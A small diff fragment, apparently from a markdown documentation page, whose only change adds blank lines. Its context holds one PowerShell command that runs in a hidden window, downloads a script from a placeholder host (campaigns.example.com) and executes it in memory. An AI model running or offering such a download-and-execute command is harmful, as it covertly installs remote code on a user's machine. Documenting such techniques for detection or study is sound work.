@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:36:21.830055+00:00'
 ```bash
 $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))"
 ```
+
+
